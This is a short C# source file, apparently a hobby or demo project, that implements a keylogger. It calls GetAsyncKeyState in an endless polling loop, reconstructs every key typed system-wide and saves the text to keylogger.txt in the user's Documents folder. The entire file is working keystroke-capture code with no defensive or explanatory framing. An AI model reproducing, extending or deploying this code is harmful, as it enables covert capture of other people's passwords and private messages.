using System;
using System.Text;
using System.Windows.Input;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace KeyLogger
{
    public static class KeyLog
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
        public static void Start()
        {
            StringBuilder Text = new StringBuilder();
            string dirpath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(dirpath))
            {
                Directory.CreateDirectory(dirpath);
            }

            string filepath = (dirpath + @"\keylogger.txt");
            if (!File.Exists(filepath))
            {
                using (StreamWriter sw = File.CreateText(filepath)) ;
            }
            while (true)
            {
                Thread.Sleep(100);

                for (int k = 0; k < 127; k++)
                {
                    int keyState = GetAsyncKeyState(k);
                    if (keyState != 0)
                    {
                        if ((ConsoleKey)(k) == ConsoleKey.Enter)
                        {
                            Text.Append("\n");
                            Console.WriteLine();
                        }
                        if (((ConsoleKey)(k) == ConsoleKey.Backspace) && (Text.Length != 0))
                        {
                            Text.Remove(Text.Length - 1, 1);
                            Console.Write("\b \b");
                        }
                        else if (k.IsValidSymbol())
                        {
                            Text.Append((char)k);
                            Console.Write((char)k);
                        }

                        using (StreamWriter sw = new StreamWriter(filepath, false))
                        {
                            sw.Write(Text);
                        }
                    }
                }
            }
        }
    }
    public static class MyExtensions
    {
        public static bool IsValidSymbol(this int symbol)
        {
            if (Char.IsDigit((char)symbol) || Char.IsLetter((char)symbol) || Char.IsPunctuation((char)symbol) || (ConsoleKey)((char)symbol) == ConsoleKey.Spacebar)
                return true;
            return false;
        }
    }
}
